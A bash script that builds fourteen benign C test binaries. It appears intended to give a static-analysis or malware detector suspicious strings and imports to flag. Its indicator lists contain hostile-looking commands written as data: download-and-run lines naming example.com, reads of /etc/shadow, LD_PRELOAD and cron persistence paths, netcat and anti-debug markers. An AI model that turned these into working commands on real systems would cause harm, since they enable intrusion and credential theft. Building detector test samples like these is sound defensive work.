#!/usr/bin/env bash
set -euo pipefail

OUT_DIR="samples/suspicious"
CC="${CC:-gcc}"
CFLAGS=(
  -D_GNU_SOURCE
  -std=c11
  -Wall
  -Wextra
  -O0
  -g
  -fno-inline
  -fno-builtin
)
KEEP_C_SOURCES="${KEEP_C_SOURCES:-0}"

if [[ "$(uname -s)" != "Linux" ]]; then
  echo "This script is intended to build Linux ELF samples. Please run it on Ubuntu Linux." >&2
  exit 1
fi

if ! command -v "$CC" >/dev/null 2>&1; then
  echo "gcc was not found. Install it with: sudo apt update && sudo apt install build-essential" >&2
  exit 1
fi

if ! command -v file >/dev/null 2>&1; then
  echo "file was not found. Install it with: sudo apt update && sudo apt install file" >&2
  exit 1
fi

mkdir -p "$OUT_DIR"

cat > "$OUT_DIR/fake_downloader.c" <<'EOF_C'
#include <stdio.h>

int main(void) {
    const char *indicators[] = {
        "wget http://example.com/payload",
        "curl https://example.com/payload",
        "chmod +x payload",
        "/bin/sh",
        "/bin/bash",
        "/etc/passwd",
        "/tmp/payload"
    };

    puts("Reservoir harmless suspicious-string sample: fake_downloader");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("static indicator only: %s\n", indicators[i]);
    }

    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_network_client.c" <<'EOF_C'
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
    puts("Reservoir harmless networking-import sample: fake_network_client");

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    printf("prepared localhost sockaddr without connecting: family=%d port=%u\n",
           addr.sin_family, (unsigned)ntohs(addr.sin_port));

    /*
     * Keep connect as a static import without using the network.
     * The function pointer is printed, not called.
     */
    int (*connect_import)(int, const struct sockaddr *, socklen_t) = connect;
    printf("connect import present but not called: %p\n", (void *)connect_import);
    printf("socket created and closed locally: fd=%d\n", fd);

    close(fd);
    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_process_behavior.c" <<'EOF_C'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    const char *indicators[] = {
        "execve",
        "system",
        "bash -c",
        "/bin/sh -c id",
        "popen",
        "execvp",
        "kill"
    };

    puts("Reservoir harmless process-behavior string sample: fake_process_behavior");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("process indicator string only: %s\n", indicators[i]);
    }

    int (*system_import)(const char *) = system;
    int (*execve_import)(const char *, char *const[], char *const[]) = execve;
    FILE *(*popen_import)(const char *, const char *) = popen;
    printf("imports present but not called: system=%p execve=%p popen=%p\n",
           (void *)system_import, (void *)execve_import, (void *)popen_import);

    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_fork.c" <<'EOF_C'
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int main(void) {
    puts("Reservoir harmless fork/waitpid sample: fake_fork");

    pid_t child = fork();
    if (child < 0) {
        perror("fork");
        return 1;
    }

    if (child == 0) {
        _exit(0);
    }

    int status = 0;
    if (waitpid(child, &status, 0) < 0) {
        perror("waitpid");
        return 1;
    }

    printf("child exited immediately with status=%d\n", status);
    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_memory_behavior.c" <<'EOF_C'
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main(void) {
    puts("Reservoir harmless mmap/mprotect sample: fake_memory_behavior");

    long page_size = sysconf(_SC_PAGESIZE);
    if (page_size <= 0) {
        perror("sysconf");
        return 1;
    }

    void *region = mmap(NULL, (size_t)page_size, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    memcpy(region, "static-analysis test buffer", 28);
    if (mprotect(region, (size_t)page_size, PROT_READ) != 0) {
        perror("mprotect");
        munmap(region, (size_t)page_size);
        return 1;
    }

    printf("allocated local memory safely at %p and made it read-only\n", region);
    munmap(region, (size_t)page_size);
    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_antidebug_strings.c" <<'EOF_C'
#include <stdio.h>
#include <dlfcn.h>

int main(void) {
    const char *indicators[] = {
        "ptrace anti-debug check",
        "PTRACE_TRACEME",
        "/proc/self/status",
        "TracerPid",
        "anti-debug bypass"
    };

    puts("Reservoir harmless anti-debug string sample: fake_antidebug_strings");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("anti-debug indicator string only: %s\n", indicators[i]);
    }

    void *(*dlopen_import)(const char *, int) = dlopen;
    void *(*dlsym_import)(void *, const char *) = dlsym;
    printf("dynamic-loader imports present but not called: dlopen=%p dlsym=%p\n",
           (void *)dlopen_import, (void *)dlsym_import);

    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_persistence_strings.c" <<'EOF_C'
#include <stdio.h>

int main(void) {
    const char *indicators[] = {
        "cron",
        "crontab -e",
        "/etc/cron.d/reservoir-test",
        "/tmp/.cache",
        "/dev/shm/.cache",
        "LD_PRELOAD",
        "/etc/ld.so.preload",
        "iptables",
        "ssh"
    };

    puts("Reservoir harmless persistence-string sample: fake_persistence_strings");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("persistence indicator string only: %s\n", indicators[i]);
    }

    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_combo.c" <<'EOF_C'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>

int main(void) {
    const char *indicators[] = {
        "/bin/sh",
        "/bin/bash",
        "wget http://example.com/payload",
        "curl https://example.com/payload",
        "chmod +x /tmp/payload",
        "chown root:root /tmp/payload",
        "busybox telnet nc netcat",
        "/etc/passwd",
        "/etc/shadow",
        "LD_PRELOAD",
        "cron",
        "iptables",
        "ssh",
        "base64",
        "/tmp/",
        "/dev/shm",
        "/proc/",
        "ptrace anti-debug check",
        "bash -c",
        "execve",
        "system",
        "popen"
    };

    puts("Reservoir harmless high-signal combo sample: fake_combo");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("combo indicator string only: %s\n", indicators[i]);
    }

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd >= 0) {
        printf("local socket object created and closed: fd=%d\n", fd);
        close(fd);
    }

    int (*connect_import)(int, const struct sockaddr *, socklen_t) = connect;
    int (*getaddrinfo_import)(const char *, const char *, const struct addrinfo *, struct addrinfo **) = getaddrinfo;
    int (*system_import)(const char *) = system;
    void *(*mmap_import)(void *, size_t, int, int, int, off_t) = mmap;
    int (*mprotect_import)(void *, size_t, int) = mprotect;

    printf("imports present but not called: connect=%p getaddrinfo=%p system=%p mmap=%p mprotect=%p\n",
           (void *)connect_import, (void *)getaddrinfo_import, (void *)system_import,
           (void *)mmap_import, (void *)mprotect_import);

    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_privilege_strings.c" <<'EOF_C'
#include <stdio.h>
#include <unistd.h>

int main(void) {
    const char *indicators[] = {
        "setuid root helper",
        "setgid daemon helper",
        "chroot /tmp/.jail",
        "/etc/shadow",
        "/etc/passwd",
        "privilege escalation check"
    };

    puts("Reservoir harmless privilege-string/import sample: fake_privilege_strings");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("privilege indicator string only: %s\n", indicators[i]);
    }

    int (*setuid_import)(uid_t) = setuid;
    int (*setgid_import)(gid_t) = setgid;
    int (*chroot_import)(const char *) = chroot;
    printf("privilege imports present but not called: setuid=%p setgid=%p chroot=%p\n",
           (void *)setuid_import, (void *)setgid_import, (void *)chroot_import);
    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_filesystem_imports.c" <<'EOF_C'
#include <fcntl.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

int main(void) {
    const char *indicators[] = {
        "unlink /tmp/payload",
        "rename /tmp/payload /tmp/.cache",
        "chmod 755 /tmp/.cache",
        "/dev/shm/drop",
        "/proc/self/exe"
    };

    puts("Reservoir harmless filesystem-import sample: fake_filesystem_imports");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("filesystem indicator string only: %s\n", indicators[i]);
    }

    int (*open_import)(const char *, int, ...) = open;
    int (*unlink_import)(const char *) = unlink;
    int (*rename_import)(const char *, const char *) = rename;
    int (*chmod_import)(const char *, mode_t) = chmod;
    printf("filesystem imports present but not called: open=%p unlink=%p rename=%p chmod=%p\n",
           (void *)open_import, (void *)unlink_import, (void *)rename_import, (void *)chmod_import);
    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_dns_beacon_strings.c" <<'EOF_C'
#include <netdb.h>
#include <stdio.h>
#include <sys/socket.h>

int main(void) {
    const char *indicators[] = {
        "http://example.com/checkin",
        "https://example.com/api",
        "gethostbyname",
        "dns beacon interval",
        "curl -fsSL https://example.com/stage"
    };

    puts("Reservoir harmless DNS/beacon string sample: fake_dns_beacon_strings");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("network indicator string only: %s\n", indicators[i]);
    }

    int (*socket_import)(int, int, int) = socket;
    int (*getaddrinfo_import)(const char *, const char *, const struct addrinfo *, struct addrinfo **) = getaddrinfo;
    printf("network imports present but not called: socket=%p getaddrinfo=%p\n",
           (void *)socket_import, (void *)getaddrinfo_import);
    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_proc_scan_strings.c" <<'EOF_C'
#include <stdio.h>

int main(void) {
    const char *indicators[] = {
        "/proc/self/status",
        "/proc/self/maps",
        "/proc/net/tcp",
        "TracerPid",
        "ptrace anti-debug check",
        "/tmp/.proc-cache"
    };

    puts("Reservoir harmless proc-string sample: fake_proc_scan_strings");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("proc indicator string only: %s\n", indicators[i]);
    }
    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_encoded_payload_strings.c" <<'EOF_C'
#include <stdio.h>

int main(void) {
    const char *indicators[] = {
        "base64 -d /tmp/blob",
        "payload encoded with base64",
        "busybox sh",
        "/bin/sh",
        "chmod +x /tmp/blob",
        "wget http://example.com/blob"
    };

    puts("Reservoir harmless encoded-payload string sample: fake_encoded_payload_strings");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("encoded payload indicator string only: %s\n", indicators[i]);
    }
    return 0;
}
EOF_C

cat > "$OUT_DIR/fake_loader_imports.c" <<'EOF_C'
#include <dlfcn.h>
#include <stdio.h>
#include <sys/mman.h>

int main(void) {
    const char *indicators[] = {
        "LD_PRELOAD",
        "/etc/ld.so.preload",
        "dlopen loader",
        "dlsym resolver",
        "mprotect executable page"
    };

    puts("Reservoir harmless loader-import sample: fake_loader_imports");
    for (size_t i = 0; i < sizeof(indicators) / sizeof(indicators[0]); ++i) {
        printf("loader indicator string only: %s\n", indicators[i]);
    }

    void *(*dlopen_import)(const char *, int) = dlopen;
    void *(*dlsym_import)(void *, const char *) = dlsym;
    int (*mprotect_import)(void *, size_t, int) = mprotect;
    printf("loader imports present but not called: dlopen=%p dlsym=%p mprotect=%p\n",
           (void *)dlopen_import, (void *)dlsym_import, (void *)mprotect_import);
    return 0;
}
EOF_C

build_one() {
  local name="$1"
  echo "Building $OUT_DIR/$name"
  "$CC" "${CFLAGS[@]}" "$OUT_DIR/$name.c" -o "$OUT_DIR/$name" -ldl
}

build_one fake_downloader
build_one fake_network_client
build_one fake_process_behavior
build_one fake_fork
build_one fake_memory_behavior
build_one fake_antidebug_strings
build_one fake_persistence_strings
build_one fake_combo
build_one fake_privilege_strings
build_one fake_filesystem_imports
build_one fake_dns_beacon_strings
build_one fake_proc_scan_strings
build_one fake_encoded_payload_strings
build_one fake_loader_imports

if [[ "$KEEP_C_SOURCES" != "1" ]]; then
  rm -f "$OUT_DIR"/fake_downloader.c \
        "$OUT_DIR"/fake_network_client.c \
        "$OUT_DIR"/fake_process_behavior.c \
        "$OUT_DIR"/fake_fork.c \
        "$OUT_DIR"/fake_memory_behavior.c \
        "$OUT_DIR"/fake_antidebug_strings.c \
        "$OUT_DIR"/fake_persistence_strings.c \
        "$OUT_DIR"/fake_combo.c \
        "$OUT_DIR"/fake_privilege_strings.c \
        "$OUT_DIR"/fake_filesystem_imports.c \
        "$OUT_DIR"/fake_dns_beacon_strings.c \
        "$OUT_DIR"/fake_proc_scan_strings.c \
        "$OUT_DIR"/fake_encoded_payload_strings.c \
        "$OUT_DIR"/fake_loader_imports.c
fi

echo
echo "Verifying compiled samples:"
file "$OUT_DIR"/fake_downloader \
     "$OUT_DIR"/fake_network_client \
     "$OUT_DIR"/fake_process_behavior \
     "$OUT_DIR"/fake_fork \
     "$OUT_DIR"/fake_memory_behavior \
     "$OUT_DIR"/fake_antidebug_strings \
     "$OUT_DIR"/fake_persistence_strings \
     "$OUT_DIR"/fake_combo \
     "$OUT_DIR"/fake_privilege_strings \
     "$OUT_DIR"/fake_filesystem_imports \
     "$OUT_DIR"/fake_dns_beacon_strings \
     "$OUT_DIR"/fake_proc_scan_strings \
     "$OUT_DIR"/fake_encoded_payload_strings \
     "$OUT_DIR"/fake_loader_imports

echo
echo "Done. Harmless suspicious ELF samples are in $OUT_DIR"
